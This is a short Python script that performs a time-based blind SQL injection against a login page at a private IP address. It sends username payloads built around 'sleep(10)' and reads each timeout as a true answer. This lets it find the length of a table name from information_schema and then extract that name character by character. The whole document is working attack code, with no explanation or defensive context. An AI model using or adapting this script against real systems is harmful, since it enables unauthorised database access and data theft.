import sys
import requests


def send_req(Inputs,number,ascii):
        try:
            r = requests.post("http://192.168.2.52/users/login.php", data={'username': Inputs, 'password': ""}, timeout=6)
        except:
            # print (Inputs)
            if ascii:
                print(" ")
            else:
                print(str(number))
            return Inputs

for i in range(40):
    length = "a' and if(length((select table_name from information_schema.tables limit 3,1))="+str(i)+",sleep(10),1)#"
    range_value = send_req(length,i,False)
    if(range_value):
        break

range_value =int(i)+1
print("Range Value: ",range_value)
for loop2 in range(1,range_value):

    for loop in range(65,123):
        sys.stdout.write("\r"+str(chr(loop)))
        sys.stdout.flush()
        Inputs = "a' and if(ascii(substring((select table_name from information_schema.tables limit 3,1),"+str(loop2)+",1))="+str(loop)+",sleep(10),1)#"
        send_req(Inputs,loop,True)